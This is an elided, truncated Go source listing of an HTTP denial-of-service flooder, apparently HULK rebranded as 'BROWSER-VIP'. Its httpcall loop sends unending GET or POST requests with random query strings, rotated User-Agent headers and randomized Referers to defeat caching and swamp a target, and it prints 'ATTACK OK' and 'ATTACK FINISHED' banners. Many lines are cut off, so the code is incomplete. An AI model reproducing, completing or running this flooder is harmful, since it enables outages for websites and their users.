...
var (
        ...
        headersUseragents []string = []string{
                ...
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CL>
...
func main() {
        ...
        flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By>
        flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests>
...
t := os.Getenv("BROWSER-VIPMAXPROCS")
        ...
        if version {
                fmt.Println("BROWSER-VIP", version)
                os.Exit(0)
        }
...
if strings.TrimSpace(a) == "" {
        ...
        fmt.Println("\u001B[31m           ╠════════════════════════════════════════════════════>
                ...
                fmt.Println("\u001B[31mIn use               \u001B[31m║\t\u001B[35m║\tATTACK OK>
                for {
                        ...
                        case targetComplete:
                                sent++
                                fmt.Printf("\r%-6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, se>
                                fmt.Println("\r🚀BROWSER-VIP ATTACK FINISHED🚀     \n\n\r")
                                os.Exit(0)
                        }
                }
        }()
...
func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
        ...
        for {
                ...
                if data == "" {
                        q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7>
                } else {
...
q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
                ...
                q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildb>
